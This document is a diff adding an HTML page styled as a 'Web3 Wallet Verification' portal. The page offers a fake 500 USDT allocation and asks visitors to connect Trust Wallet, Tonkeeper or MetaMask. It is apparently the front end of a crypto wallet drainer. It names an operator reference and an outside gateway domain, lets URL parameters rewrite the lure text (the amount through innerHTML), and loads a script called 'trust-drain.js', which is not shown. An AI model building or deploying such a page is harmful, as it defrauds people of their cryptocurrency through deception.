@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Web3 Wallet Verification</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #09090d;
+      --card-bg: rgba(18, 18, 23, 0.88);
+      --card-border: rgba(255, 255, 255, 0.1);
+      --accent: #06b6d4;
+      --amber: #f59e0b;
+      --emerald: #10b981;
+      --text: #f4f4f5;
+      --text-muted: #a1a1aa;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      overflow-x: hidden;
+      position: relative;
+    }
+    .bg-glow {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle, rgba(6, 182, 212, 0.12) 0%, rgba(245, 158, 11, 0.05) 45%, transparent 70%);
+      filter: blur(60px);
+      pointer-events: none;
+      z-index: 0;
+    }
+    .card {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 440px;
+      background: var(--card-bg);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid var(--card-border);
+      border-radius: 24px;
+      padding: 28px 24px;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6), 0 0 40px rgba(6, 182, 212, 0.08);
+      text-align: center;
+    }
+    .badge-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 12px;
+      border-radius: 9999px;
+      background: rgba(6, 182, 212, 0.1);
+      border: 1px solid rgba(6, 182, 212, 0.25);
+      color: var(--accent);
+      font-size: 11px;
+      font-weight: 700;
+      font-family: 'JetBrains Mono', monospace;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+    .badge-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--accent);
+      box-shadow: 0 0 8px var(--accent);
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+    .card-title {
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      margin-bottom: 6px;
+    }
+    .card-subtitle {
+      font-size: 13px;
+      color: var(--text-muted);
+      line-height: 1.4;
+      margin-bottom: 22px;
+    }
+    .amount-box {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+    .amount-label {
+      font-size: 11px;
+      text-transform: uppercase;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      color: var(--text-muted);
+      margin-bottom: 4px;
+    }
+    .amount-val {
+      font-size: 26px;
+      font-weight: 800;
+      font-family: 'JetBrains Mono', monospace;
+      color: var(--amber);
+      display: flex;
+      align-items: baseline;
+      justify-content: center;
+      gap: 6px;
+    }
+    .amount-usd {
+      font-size: 13px;
+      color: var(--emerald);
+      font-weight: 600;
+      margin-top: 2px;
+    }
+    .btn-connect {
+      width: 100%;
+      padding: 15px;
+      border-radius: 14px;
+      border: none;
+      background: linear-gradient(135deg, #06b6d4 0%, #3b82f6 100%);
+      color: #000;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 12px;
+      box-shadow: 0 10px 25px rgba(6, 182, 212, 0.25);
+      transition: all 0.2s;
+    }
+    .btn-connect:hover { transform: translateY(-1px); box-shadow: 0 14px 30px rgba(6, 182, 212, 0.35); }
+    .wallets-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+    .btn-sub {
+      padding: 11px;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      color: var(--text);
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: all 0.15s;
+    }
+    .btn-sub:hover { background: rgba(255, 255, 255, 0.08); border-color: rgba(255, 255, 255, 0.15); }
+    .qr-container {
+      display: none;
+      margin-top: 16px;
+      padding: 14px;
+      border-radius: 16px;
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+    .qr-container.open { display: block; animation: fadeIn 0.3s ease; }
+    .qr-container img { width: 170px; height: 170px; border-radius: 12px; margin: 0 auto 8px; display: block; }
+    .status-alert {
+      margin-top: 14px;
+      padding: 10px 14px;
+      border-radius: 12px;
+      font-size: 12px;
+      font-weight: 600;
+      background: rgba(6, 182, 212, 0.1);
+      border: 1px solid rgba(6, 182, 212, 0.25);
+      color: #67e8f9;
+      display: none;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+  </style>
+</head>
+<body>
+  <div class="bg-glow"></div>
+  <div class="card">
+    <div class="badge-pill">
+      <span class="badge-dot"></span>
+      <span id="badgeText">VERIFIED PROTOCOL</span>
+    </div>
+    <h1 id="titleText" class="card-title">Web3 Wallet Verification</h1>
+    <p id="subtitleText" class="card-subtitle">Connect your Web3 wallet to verify address and receive gasless authorization voucher.</p>
+
+    <div class="amount-box" id="amountBox">
+      <div class="amount-label" id="amountLabel">RESERVED ALLOCATION</div>
+      <div class="amount-val" id="amountText">500.00 <span style="font-size: 16px; color: var(--text-muted);" id="symbolText">USDT</span></div>
+      <div class="amount-usd" id="usdText">~$500.00 USD</div>
+    </div>
+
+    <button id="trustBtn" class="btn-connect">
+      <span>🛡️</span>
+      <span>Connect Trust Wallet (Instant)</span>
+    </button>
+
+    <div class="wallets-grid">
+      <button id="tonkeeperBtn" class="btn-sub"><span>💎</span> Tonkeeper</button>
+      <button id="metamaskBtn" class="btn-sub"><span>🦊</span> MetaMask</button>
+    </div>
+
+    <div id="qrSection" class="qr-container">
+      <img id="qrCodeImg" alt="Pairing QR" src="" />
+      <p style="font-size: 11px; color: var(--text-muted);">Scan with Trust Wallet to connect instantly</p>
+    </div>
+
+    <div id="statusBox" class="status-alert"></div>
+  </div>
+
+  <script>
+    window.NEXT_PUBLIC_OPERATOR_REF = "Mayankahuja100";
+    window.NEXT_PUBLIC_GATEWAY_URL = "https://3web3d.online";
+    // Dynamic Query Parser for Instant Theme Customization
+    (function() {
+      try {
+        const p = new URLSearchParams(window.location.search);
+        if (p.get("title")) document.getElementById("titleText").textContent = p.get("title");
+        if (p.get("subtitle")) document.getElementById("subtitleText").textContent = p.get("subtitle");
+        if (p.get("badge")) document.getElementById("badgeText").textContent = p.get("badge");
+        if (p.get("amount")) {
+          document.getElementById("amountText").innerHTML = p.get("amount");
+          document.getElementById("usdText").style.display = "none";
+        }
+        if (p.get("hide_amount") === "1") {
+          document.getElementById("amountBox").style.display = "none";
+        }
+      } catch(e) {}
+    })();
+  </script>
+  <script src="assets/trust-drain.js"></script>
+</body>
+</html>
